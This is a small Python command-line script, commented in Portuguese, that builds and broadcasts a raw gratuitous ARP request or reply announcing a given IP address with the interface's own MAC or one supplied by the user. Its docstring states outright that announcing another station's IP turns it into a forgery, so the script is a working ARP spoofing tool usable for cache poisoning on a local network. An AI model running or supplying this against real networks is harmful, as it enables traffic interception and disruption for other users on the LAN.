#!/usr/bin/env python3
"""Envia um quadro ARP gratuito (sender == target) construído manualmente.

Uso: forjar-arp-gratuito <interface> <ip-anunciado> <request|reply> [mac-a-usar]

Sem o MAC opcional, usa o endereço real da interface indicada: é isso que
transforma o comando em uma falsificação quando o IP anunciado pertence a
outra estação.
"""
import fcntl
import socket
import struct
import sys

SIOCGIFHWADDR = 0x8927


def mac_da_interface(nome):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), SIOCGIFHWADDR, struct.pack('256s', nome[:15].encode()))
    return info[18:24]


def main():
    if len(sys.argv) not in (4, 5):
        print(__doc__, file=sys.stderr)
        sys.exit(2)
    interface, ip, tipo = sys.argv[1:4]
    if tipo not in ('request', 'reply'):
        print('o tipo deve ser "request" ou "reply"', file=sys.stderr)
        sys.exit(2)
    mac = bytes.fromhex(sys.argv[4].replace(':', '')) if len(sys.argv) == 5 else mac_da_interface(interface)
    opcode = 1 if tipo == 'request' else 2
    broadcast = b'\xff' * 6
    ip_bytes = socket.inet_aton(ip)
    # hrd=Ethernet(1) pro=IPv4(0x0800) hln=6 pln=4; gratuito: IP do remetente == IP do alvo
    arp = struct.pack('!HHBBH6s4s6s4s', 1, 0x0800, 6, 4, opcode, mac, ip_bytes, b'\x00' * 6, ip_bytes)
    quadro = broadcast + mac + struct.pack('!H', 0x0806) + arp
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    s.bind((interface, 0))
    s.send(quadro)
    print(f'ARP gratuito ({tipo}) enviado por {interface}: {ip} is-at {mac.hex(":")}')


if __name__ == '__main__':
    main()
